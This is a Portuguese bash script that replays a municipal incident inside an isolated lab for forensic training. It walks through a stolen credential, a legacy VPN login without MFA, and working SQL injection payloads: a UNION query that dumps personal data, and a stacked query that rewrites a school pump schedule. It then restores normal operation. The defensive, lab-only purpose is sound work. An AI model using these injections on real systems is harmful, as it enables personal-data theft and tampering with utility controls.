#!/usr/bin/env bash
# Reprodução CONTROLADA do INC-VA-0712 no laboratório (RT-14). Somente contra os containers deste repositório.
# Usa os componentes LEGADOS (perfil "legado") para mostrar o "antes", e registra cada passo em um diário
# com horário UTC, que entra no processo forense como evidência do operador.
#   Uso: forensics/reproducao.sh <caso>     (ex.: forensics/reproducao.sh LAB-INC-VA-0712)
set -uo pipefail
source "$(dirname "$0")/../scripts/lib.sh"; cd "$ROOT"
CASE="${1:-LAB-INC-VA-0712}"; DIR="forensics/cases/$CASE"; mkdir -p "$DIR"
J="$DIR/diario_operador.txt"
step() { printf '%s  %s\n' "$(date -u +%FT%T.%3NZ)" "$*" | tee -a "$J"; }
X() { docker compose exec -T externo "$@"; }

step "INÍCIO da reprodução do INC-VA-0712 — caso $CASE (laboratório isolado)"
docker compose --profile legado up -d vpn-legado painel-legado-app painel-legado-gw externo >/dev/null 2>&1
sleep 8

step "PASSO 1 (phishing): credencial da coordenadora considerada comprometida (campanha de treinamento, dia 6)"
U=marta.coord; PW=$(painel_pw "$U")

step "PASSO 2 (VPN legada só com senha): conexão a partir de 172.30.99.66"
printf '%s\n%s\n' "$U" "$PW" | X sh -c 'cat > /tmp/cred; chmod 600 /tmp/cred'
X sh -c 'cat > /tmp/c.ovpn <<EOF
client
dev tun
proto udp
remote 172.30.99.3 1194
auth-user-pass /tmp/cred
nobind
verb 2
<ca>
EOF
' ; docker compose cp pki/out/ca-chain.crt externo:/tmp/ca.pem >/dev/null 2>&1
X sh -c 'cat /tmp/ca.pem >> /tmp/c.ovpn; echo "</ca>" >> /tmp/c.ovpn; openvpn --config /tmp/c.ovpn --daemon --log /tmp/ovpn.log'
for _ in $(seq 1 20); do X sh -c 'ip -4 addr show tun0' >/dev/null 2>&1 && break; sleep 1; done
step "  túnel legado: $(X sh -c "ip -4 -o addr show tun0 | awk '{print \$4}'" 2>/dev/null || echo FALHOU)"

L="https://172.30.30.80:9443"
step "PASSO 3 (painel legado sem MFA): login com a credencial"
X sh -c "curl -sk -c /tmp/j -o /dev/null -w '%{http_code}' --data-urlencode username=$U --data-urlencode 'password=$PW' $L/login" | xargs -I{} sh -c "printf '%s  %s\n' \"\$(date -u +%FT%T.%3NZ)\" '  HTTP {}' | tee -a $J"

step "PASSO 4 (SQL Injection no histórico de acessos): extração da tabela de pessoas (dados sintéticos)"
N=$(X sh -c "curl -sk -b /tmp/j -G $L/acessos --data-urlencode \"q=x' UNION SELECT now(),nome,email,telefone,true,papel FROM cadastro.pessoas--\"" | grep -c '@')
step "  linhas com e-mail retornadas: $N"

step "PASSO 5 (SQLi empilhada): alteração da agenda da bomba da escola para 03:00-03:10"
X sh -c "curl -sk -b /tmp/j -o /dev/null -G $L/acessos --data-urlencode \"q=x'; UPDATE ops.pump_schedule SET windows='03:00-03:10', updated_by='$U' WHERE site='escola';--\""
step "  agenda no banco: $(psql_q "select windows from ops.pump_schedule where site='escola'")"

step "PASSO 6 (queda da fibra na UBS + câmara fria fora da faixa)"
docker compose exec -T wg-ubs /opt/edge/link.sh fibra down >/dev/null
docker compose exec -T wg-ubs /opt/edge/link.sh 4g down >/dev/null
echo '{"ubs-camara-fria":{"offset":{"temp_c":7}}}' > data/control/faults.json
sleep 40
step "  alarmes locais na UBS: $(curl -s localhost:8083/api/status | python3 -c 'import sys,json;print(list(json.load(sys.stdin)["alarms"]))')"
step "  decisão da borda sobre a agenda: $(psql_q "select status||' — '||coalesce(result->>'reason','') from ops.commands where action='set_schedule' order by created_at desc limit 1")"

step "FIM do ataque — restabelecendo operação"
echo '{}' > data/control/faults.json
docker compose exec -T wg-ubs /opt/edge/link.sh 4g up >/dev/null
docker compose exec -T wg-ubs /opt/edge/link.sh fibra up >/dev/null
X sh -c 'pkill openvpn' 2>/dev/null
psql_q "update ops.pump_schedule set windows='05:00-07:00,17:00-19:00', updated_by='resposta-incidente' where site='escola'" >/dev/null
psql_q "update cadastro.operadores set bloqueado_ate=null where username='$U'" >/dev/null
step "Operação restabelecida. Próximo: forensics/coleta.sh $CASE"
